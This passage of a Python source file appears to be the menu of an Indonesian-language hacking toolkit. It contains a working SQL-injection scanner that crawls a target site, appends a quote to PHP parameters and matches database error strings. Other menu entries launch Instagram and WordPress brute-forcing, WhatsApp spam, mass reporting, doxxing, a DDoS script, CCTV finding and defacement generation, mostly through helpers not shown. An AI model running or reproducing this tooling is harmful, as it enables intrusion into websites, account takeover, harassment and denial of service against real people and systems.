        clear()
        Title("SQL Vulnerability Scanner")
        os.system("neofetch --ascii_distro debian linux")
        Write.Print(f"[+] Welcome To SQL Vulnerability", Colors.blue_to_green, interval=0.05)
        Write.Print(f"\n[+] Coded By MrPstar7\n", Colors.yellow_to_red, interval=0.05)
        def get_domain(url):

            parsed_url = urlparse(url)
            return parsed_url.netloc
        
        def extract_internal_links(base_url, html_content):
            soup = BeautifulSoup(html_content, 'html.parser')
            internal_links = []
            domain = get_domain(base_url)
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(base_url, href)
                if get_domain(full_url) == domain or href.startswith('/'):
                    internal_links.append(full_url)
            return internal_links
        
        def detect_sql_error(url):
            sql_error_keywords = [
                "MySql", "sql", "SQL", "Sql", "Error","Warning", "MySQL", "mysql", "SQL syntax", 
                "SQL error", "Failed to evaluate", "SQLSTATE", "ORA-", "PL/SQL", "PostgreSQL",
                "sqlite3", "DB2", "Microsoft OLE DB Provider for SQL Server",
                "Driver][SQLFetchBuffer", "Postgres", "MariaDB", "Microsoft SQL Server",
                "Sybase", "SQLite", "SQLite3", "Oracle", "ODBC", "JDBC",
                "Microsoft Access Driver", "SQL Server", "SQL command not properly ended",
                "SQL statement not ended properly", "SQL Exception", "SQL Server error",
                "PostgreSQL error", "Oracle error", "DB2 SQL error", "SQLite error",
                "MariaDB error", "NoSQL error", "Error in SQL syntax",
                "You have an error in your SQL syntax", "Incorrect syntax near",
                "Syntax error", "Unclosed quotation mark after the character string",
                "The multi-part identifier could not be bound", "Operand type clash",
                "The used SELECT statements have a different number of columns",
                "Column count doesn't match value count", "Invalid column name",
                "Unknown column", "Table 'database.table' doesn't exist",
                "Unknown table", "Table alias", "Unknown database", "Duplicate entry",
                "Data too long", "Division by zero", "Arithmetic overflow error",
                "Numeric overflow", "Numeric value out of range",
                "Truncated incorrect DOUBLE value", "Access denied for user",
                "Authentication failed", "Connection refused", "Connection timed out",
                "Host 'xxx.xxx.xxx.xxx' is not allowed to connect to this MySQL server",
                "Too many connections", "Out of memory", "Lock wait timeout exceeded",
                "Deadlock found", "Foreign key constraint", "Deadlock", "Key not found",
                "Index not found", "Duplicate key", "Duplicate entry for key",
                "Primary key constraint", "Cannot add or update a child row",
                "Cannot delete or update a parent row", "Cannot drop the table",
                "Cannot create the database", "Cannot create the table",
                "Cannot drop the database",
                "Cannot truncate a table referenced in a foreign key constraint",
                "Cannot drop the index", "Cannot modify column",
                "Cannot delete a parent row",
                "Cannot truncate a table referenced in a foreign key constraint",
                "Table doesn't support FULLTEXT indexes", "Incorrect date value",
                "Invalid datetime format", "Invalid date", "Invalid time",
                "Invalid default value", "Invalid use of NULL value", "Data truncated",
                "Data too long for column", "Invalid TIMESTAMP value", "Error writing file",
                "File could not be opened", "Can't read dir", "Can't create/write to file",
                "Disk full", "Internal server error", "Internal error", "Server error",
                "General error", "Unknown error", "Unspecified error", "Fatal error",
                "Unknown character set", "Unknown collation", "Charset mismatch",
                "Illegal mix of collations", "Client does not support authentication protocol",
                "Client does not support authentication protocol requested by server",
                "Client does not support SSL",
                "Client does not support authentication protocol requested by server",
                "Connection using old (pre-4.1.1) authentication protocol refused",
                "Password authentication failed", "Access denied", "Permission denied",
                "No such file or directory", "Operation not permitted",
                "Too many open files", "File not found", "File already exists",
                "Directory not found", "No such file or directory", "File exists",
                "No space left on device", "Read-only file system", "Input/output error",
                "Permission denied", "Error while loading shaM libraries",
                "Library not loaded", "Unable to open database file",
                "Database disk image is malformed", "Database or disk is full",
                "Database is locked", "SQLite busy", "Unable to open database",
                "Unable to fetch row", "Rowid not found", "Database table is locked",
                "Database schema has changed", "SQLite constraint violation",
                "Failed to",
            ]
        
            error_sql = False
            vulnerability_url = url
        
            code_sql = [
                ".php?id=", ".php?kat=", ".php?style=", ".php?rubid=", ".php?mn=",
                ".php?n=", ".php?lang=", ".php?view=", ".php?cID=", ".php?aID=",
                ".php?page=", ".php?"
            ]
        
            for code in code_sql:
                if code in url:
                    try:
                        parts = url.split(code)
                        if len(parts) > 1:
                            vulnerability_url = parts[0] + code + parts[1] + "'"
                            response = requests.get(vulnerability_url)
                            content = response.text
                            for keyword in sql_error_keywords:
                                if keyword in content:
                                    error_sql = True
                                    return error_sql, vulnerability_url
                    except Exception as e:
                        print(f"{M}{M} Error: {P}{e}")
        
            return error_sql, vulnerability_url
        def get_all_internal_links_recursive(start_url, visited=None):
            if visited is None:
                visited = set()
            domain = get_domain(start_url)
            visited.add(start_url)
            response = requests.get(start_url)
            internal_links = extract_internal_links(start_url, response.content)
            for link in internal_links:
                full_url = urljoin(start_url, link)
                if full_url not in visited and get_domain(full_url) == domain:
                    error_sql, vulnerability_url = detect_sql_error(full_url)
                    if error_sql == True:
                        print(f"{H}[{P}{current_time_hour()}{H}] {GEN_VALID} Vulnerability: {P}{error_sql}{H}  | Url: {P}{full_url}")
                    elif error_sql == False:
                        print(f"{M}[{P}{current_time_hour()}{M}] {GEN_INVALID} Vulnerability: {P}{error_sql}{M} | Url: {P}{full_url}")
        
                    get_all_internal_links_recursive(full_url, visited)
        
        start_url = input(f"\n{M} Website Url -> {P}")
        
        print(f"{M} Vulnerability Search On: {P}{start_url}")
        try:
            get_all_internal_links_recursive(start_url)
            print(f"{M} Finish.")
            Continue()
        except:
            print(f"{M} Finish.")
            Continue()
        Continue()
        a()
        
    elif choice in["5","05"]:
        Title("Instagram Bruteforce")
        os.system("python ./Settings/Program/ig.py")
        Continue()
        a()
        
    elif choice in["6","06"]:
        clear()
        Title("Spam WhatsApp")
        logo_spam()
        nomor = Write.Input("Masukkan Nomor Target  (62xxxx) -> ", Colors.red_to_purple, interval=0.0025)
        Write.Print(f"Sedang Mengirim Spam Ke {nomor}, Tekan CTRL + Z Untuk Berhenti", Colors.blue_to_green, interval=0.05)
        jam(nomor)
        Continue()
        a()
    
    elif choice in["7","07"]:
        clear()
        Title("Report Instagram")
        logo_ig()
        user = input(f'{M}[{P}+{M}] {B}Input Username Target : ')
        name = input(f'{M}[{P}+{M}] {B}Input Name Target : ')
        report_ig(user, name)
        Continue()
        a()
        
    elif choice in["8","08"]:
        Title("Dox Tracker")
        clear()
        dox_trac()
        Continue()
        a()
       
    elif choice in["9","09"]:
        Title("Dox Create")
        doxcreate()
        Continue()
        a()
     
    elif choice == "10":
        clear()
        Title("Subdomain Finder")
        Write.Print(f"""
███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗    
██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║    
███████╗██║   ██║██████╔╝██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║    
╚════██║██║   ██║██╔══██╗██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║    
███████║╚██████╔╝██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║    
╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝    
                                                                              
███████╗██╗███╗   ██╗██████╗ ███████╗██████╗                                  
██╔════╝██║████╗  ██║██╔══██╗██╔════╝██╔══██╗                                 
█████╗  ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝                                 
██╔══╝  ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗                                 
██║     ██║██║ ╚████║██████╔╝███████╗██║  ██║                                 
╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝                                 
""", Colors.blue_to_green, interval=0.005)
        target_url = Write.Input("Enter the target URL (e.g., example.com) : ", Colors.blue_to_green, interval=0.0025).strip()
        subdo(target_url)
        Continue()
        a()
        
    elif choice == "11":
        clear()
        Title("Bot Auto Share Facebook")
        print(f"""{B}
        
 _____ _                     ______ _     
/  ___| |                    |  ___| |    
\ `--.| |__   __ _ _ __ ___  | |_  | |__  
 `--. \ '_ \ / _` | '__/ _ \ |  _| | '_ \ 
/\__/ / | | | (_| | | |  __/ | |   | |_) |
\____/|_| |_|\__,_|_|  \___| \_|   |_.__/ 
                
""")
        ____________________________________________()
        
    elif choice == "12":
        clear()
        Title("Phone Number Info")
        phone_info()
        Continue()
        a()
        
    elif choice == "13":
        os.system("python3 ./DDOS/Layer4/main.py")
        Continue()
        a()       
        
    elif choice == "14":
        Title("Ip Tracker")
        clear()
        print(f"""{M}
 ██▓ ██▓███     ▄▄▄█████▓ ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███  
▓██▒▓██░  ██▒   ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒██▒▓██░ ██▓▒   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
░██░▒██▄█▓▒ ▒   ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░██░▒██▒ ░  ░     ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
░▓  ▒▓▒░ ░  ░     ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░░▒ ░            ░      ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ▒ ░░░            ░        ░░   ░   ░   ▒   ░        ░ ░░ ░    ░     ░░   ░ 
 ░                          ░           ░  ░░ ░      ░  ░      ░  ░   ░     
                                            ░                         
""")
        IP_Track()
        Continue()
        a()      
        
    elif choice == "15":
        Title("Get Ip Website")
        clear()
        print(f"""{B}
____ ____ ___    _ _ _ ____ ___  ____ _ ___ ____    _ ___  
| __ |___  |     | | | |___ |__] [__  |  |  |___    | |__] 
|__] |___  |     |_|_| |___ |__] ___] |  |  |___    | |    
""")
        web_ip()
        Continue()
        a()        
    
    elif choice == "16":
        clear()
        manuk()
        ip_port()
        Continue()
        a()        
        
    elif choice == "17":
        clear()
        print(f"""{M}
    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣶⣶⡆⠀⠀⠀⠀⢰⣶⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣧⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣧⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡇⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣧⠀⢀⣠⣴⣾⠿⠟⠛⠛⠛⠛⠛⠛⠛⠻⠿⢿⣷⣦⣄⠀⠀⣾⣿⣿⣿⣿⣿⣿⡄⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣧⢿⡿⠋⠀⣀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣤⡀⠈⠛⢿⡿⣼⣿⣿⣿⣿⣿⣿⣿⠇
           ⣿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠘⢿⣿⣿⣿⣿⣿⣿⣿⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⠏⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠇⠘⣿⡟⠙⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⢻⣿⠀⠸⠿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀
⠀⣰⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⣿⣿⣿⣿⡇⠀⣿⣧⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⣼⡟⠀⣾⣿⣿⣿⣷⠀⠀⠀ ⠉⠛⢿⣿⣿⣿⣿⣿⡄⠀
⢀⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡄⠘⣿⣷⣤⣀⣀⡀⠀⣈⣩⣿⣿⣍⣁⠀⣀⣀⣀⣠⣼⣿⠇⢠⣿⣿⣿⣿⡟⠀⠀⠀ ⠀⠀⠀⠙⢿⣿⣿⣿⣷⠀
⣸⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⡟⠀⣨⣿⣿⣿⣿⣿⣿⣿⡿⢀⡀⢿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀ ⠀⠀⠀⠀⠈⢿⣿⣿⣿⡇
⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡇⠀⣿⣿⣿⡿⠛⠉⣿⣿⣧⣾⣷⣼⣿⣿⡟⠋⠉⢻⣿⡿⠀⣸⣿⣿⣿⣿⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠘⣿⣿⣿⡇
⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣄⠈⠋⠉⠒⠀⠀⣿⣿⣿⣿⢿⡟⣻⣿⡇⠀⠀⠙⠉⣀⣴⣿⣿⣿⣿⠇⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇
⢹⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣾⣷⣄⡀⠀⣿⣿⣿⣿⢸⡇⣿⣿⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠘⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⢸⣿⢸⡇⣿⡿⠀⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⢸⣿⣿⠁
⠀⠙⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⡿⠀⢸⣿⢸⣿⢸⡇⣿⡇⠀⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠘⠿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⡿⣱⡆⠸⣿⢸⣿⣿⡇⣿⡇⠀⣞⠿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣷⣄⣈⡈⠉⠈⢁⣉⣁⣴⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣷⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠛⠋⠉⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")
        Title("Domain Grabber")
        DomainGrabber()
        Continue()
        a()        
        
    elif choice == "18":
        clear()
        Title("WordPress Bruteforce")
        os.system("bash ./Settings/Program/wp.sh")
        Continue()
        a()    
        
    elif choice == "19":
        clear()
        wedus()
        Title("Python Obfuscation")
        input_user = input(f"{M}[{P}+{M}] {O} Enter Input File (example > /sdcard/file.py) : {P}")
        out = input(f"{M}[{P}+{M}] {O} Enter Output File (example > /sdcard/file_enc.py) : {P}")
        clear()
        os.system(f"python ./Settings/Program/Enc/blank.py -i {input_user} -o {out}")
        print(f"{H}DONE!")
        Continue()
        a()            
        
    elif choice == "20":
        clear()
        Title("Search DataBase")

        folder_database_relative = "./DataBase"
        folder_database = os.path.abspath(folder_database_relative)
        
        tengkorak()
        search = input(f"\n{M} Search -> {P}")
        
        print(f"{WAIT} Search in DataBase..")
        
        try:
            files_searched = 0
        
            def check(folder):
                global files_searched
                results_found = False
                print(f"{WAIT} Search in {P}{folder}")
                for element in os.listdir(folder):
                    chemin_element = os.path.join(folder, element)
                    if os.path.isdir(chemin_element):
                        check(chemin_element)
                    elif os.path.isfile(chemin_element):
                        try:
                            with open(chemin_element, 'r', encoding='utf-8') as file:
                                line_number = 0
                                files_searched += 1
                                Title(f"{files_searched} - {element}")
                                for line in file:
                                    line_number += 1
                                    if search in line:
                                        results_found = True
                                        line_info = line.strip().replace(search, f"{K}{search}{P}")
                                        print(f"""{M}
        - Folder : {P}{folder}{M}
        - File   : {P}{element}{M}
        - Line   : {P}{line_number}{M}
        - Result : {P}{line_info}
        """)
                        except UnicodeDecodeError:
                            try:
                                with open(chemin_element, 'r', encoding='latin-1') as file:
                                    files_searched += 1
                                    line_number = 0
                                    Title(f"{files_searched} | {element}")
                                    for line in file:
                                        line_number += 1
                                        if search in line:
                                            results_found = True
                                            line_info = line.strip().replace(search, f"{K}{search}{P}")
                                            print(f"""{M}
        - Folder : {P}{folder}{M}
        - File   : {P}{element}{M}
        - Line   : {P}{line_number}{M}
        - Result : {P}{line_info}
        """)
                            except Exception as e:
                                print(f"{M} Error reading file \"{P}{element}{M}\": {P}{e}")
                        except Exception as e:
                            print(f"{M} Error reading file \"{P}{element}{M}\": {P}{e}")
                return results_found
        
            results_found = check(folder_database)
            if not results_found:
                print(f"{M} No result found for \"{P}{search}{M}\".")
        
            print(f"{M} Total files searched: {P}{files_searched}")
        
        except Exception as e:
            print(f"{M} Error during search: {P}{e}")
        
        Continue()
        a()
        
    elif choice == "21":
        clear()
        Title("Database Finder")
        databs_find()
        
    elif choice == "22":
        Title("Data Leak")
        data_leak()
        
    elif choice == "23":
        clear()
        wedus()
        Title("Cctv Finder")
        cctv()
        Continue()
        a()
        
    elif choice == "24":
        clear()
        print(
        f"""{M}
██████╗ ██╗██████╗       ██████╗ ██╗   ██╗███████╗████████╗███████╗██████╗ 
██╔══██╗██║██╔══██╗      ██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██║  ██║██║██████╔╝█████╗██████╔╝██║   ██║███████╗   ██║   █████╗  ██████╔╝
██║  ██║██║██╔══██╗╚════╝██╔══██╗██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗
██████╔╝██║██║  ██║      ██████╔╝╚██████╔╝███████║   ██║   ███████╗██║  ██║
╚═════╝ ╚═╝╚═╝  ╚═╝      ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
         """)
        Title("Dir Buster")
        url = input(f"{M}[{P}+{M}] {O} Enter Target Site : {P}")
        Scan(url)
        Continue()
        a()
        
    elif choice == "25":
        clear()
        Title("Script Deface Generator")
        dfc()
        Continue()
        a()
        
    elif choice == "26":
        clear()
        Title("YouTube Downloader ")
        yt()
        Continue()
        a()
        
    elif choice == "27":
        clear()
        print(f"""{M}
                          .                                                      .
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⠞⠋⠁⣀⣠⣴⣶⣾⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠟⢻⣧⣤⣴⣿⠿⠋⠁⣴⡿⠿⢿⣿⣿⣿⣷⣶⣶⣶⣶⡶⠶⠚⠁⠀⠀⣠⣾⠏⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣾⣿⣥⣤⣤⣭⣍⣁⡀⠀⠀⠘⣿⣇⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⢀⣠⣴⣿⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡶⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠘⢿⣷⣦⣄⣀⣀⣀⣀⣀⣤⣤⣶⣾⣿⡿⠛⠁⠀⠀⢀⡀
⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠛⣩⣿⠿⠋⠁⠀⠀⣠⣶⠟⠋⠀
⠀⠀⠀⠀⠀⢠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢄⠀⠀⠀⠀⣼⣿⠁⠀⠀⠀⢠⣾⡿⠃⠀⠀⠀
⠀⠀⠀⠀⣠⡟⡡⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠸⣿⣄⠀⢀⣴⣿⣿⠁⠀⠀⠀⠀
⠀⠀⠀⢠⡟⡜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⢀⣤⠶⠒⠛⠛⠒⠲⢤⡀⠀⠘⣷⠀⠀⠀⠙⠻⠿⠿⢿⣿⠇⠀⠀⠀⠀⠀
⠀⣠⡶⠿⢇⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⢀⡴⢪⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠙⢄⠀⢹⡄⠀⠀⠀⠀⠀⢀⣿⡟⠀⠀⠀⠀⠀⠀
⠀⠙⢷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⣦⣤⡞⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡄⠀⡇⠀⠀⠀⢀⣠⣾⠟⢠⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡟⣿⣆⢀⠀⠀⠀⠀⠀⣠⠾⠕⠉⢉⣉⠀⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠃⠀⣠⣶⣿⠟⠋⢀⣾⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢰⣿⣿⣯⣧⠠⠮⠴⠞⣁⣠⣴⣾⣿⣿⣷⡌⣿⠋⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠉⠀⠀⣠⣾⡏⠀⠀⠀⠀⠀⠀
⠀⣠⠴⢾⣿⣿⣿⣿⠀⠳⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣷⣤⣴⣾⣿⠟⠀⠀⠀⠀⠀⠀⠀
⢰⠁⠀⠀⠙⣿⣿⣧⠈⡆⢻⢿⣿⣿⣿⣿⣿⠿⠟⣃⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠂⣼⠀⢈⣩⣽⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀
⣞⠀⠀⠀⣠⣿⣿⡿⠀⢺⡀⢑⡈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠈⠻⣦⡞⠀⠀⠀⠀⠀⢠⣮⣾⣿⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢻⣦⣄⣴⡿⡿⠷⣿⠠⣀⡨⠥⣞⣳⡄⠀⢀⡀⠀⠀⠀⠀⠀⣀⣿⣇⠀⠀⠀⣀⣴⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
